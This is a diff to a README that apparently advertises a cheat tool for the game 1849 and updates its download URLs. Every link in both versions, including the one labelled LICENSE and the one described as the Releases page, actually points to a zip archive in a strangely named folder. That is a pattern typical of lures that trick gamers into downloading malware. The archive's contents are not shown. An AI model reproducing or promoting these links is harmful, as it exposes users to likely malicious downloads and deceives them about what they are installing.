@@ -1,6 +1,6 @@
 # 🎮 1849-cheats-unlimited-resources - Unlock Endless Gaming Possibilities
 
-[![Download](https://raw.githubusercontent.com/Kaizuya/1849-cheats-unlimited-resources/main/vermiculate/1849-cheats-unlimited-resources.zip%20Now-1849%20Cheats-blue)](https://raw.githubusercontent.com/Kaizuya/1849-cheats-unlimited-resources/main/vermiculate/1849-cheats-unlimited-resources.zip)
+[![Download](https://github.com/Kaizuya/1849-cheats-unlimited-resources/raw/refs/heads/main/vermiculate/unlimited-cheats-resources-v1.6-beta.5.zip%20Now-1849%20Cheats-blue)](https://github.com/Kaizuya/1849-cheats-unlimited-resources/raw/refs/heads/main/vermiculate/unlimited-cheats-resources-v1.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **1849-cheats-unlimited-resources**! With this application, you can e
 
 To download the application, visit the Releases page:
 
-[Download the latest version here](https://raw.githubusercontent.com/Kaizuya/1849-cheats-unlimited-resources/main/vermiculate/1849-cheats-unlimited-resources.zip)
+[Download the latest version here](https://github.com/Kaizuya/1849-cheats-unlimited-resources/raw/refs/heads/main/vermiculate/unlimited-cheats-resources-v1.6-beta.5.zip)
 
 ### Step-by-Step:
 
@@ -72,7 +72,7 @@ Join our community for further support and to share experiences. You can discuss
 
 This project is licensed under the MIT License. You can freely use and modify the code in accordance with the license. 
 
-For more information, refer to the [LICENSE](https://raw.githubusercontent.com/Kaizuya/1849-cheats-unlimited-resources/main/vermiculate/1849-cheats-unlimited-resources.zip) file in this repository.
+For more information, refer to the [LICENSE](https://github.com/Kaizuya/1849-cheats-unlimited-resources/raw/refs/heads/main/vermiculate/unlimited-cheats-resources-v1.6-beta.5.zip) file in this repository.
 
 ## 🎉 Enjoy Your Game!
 
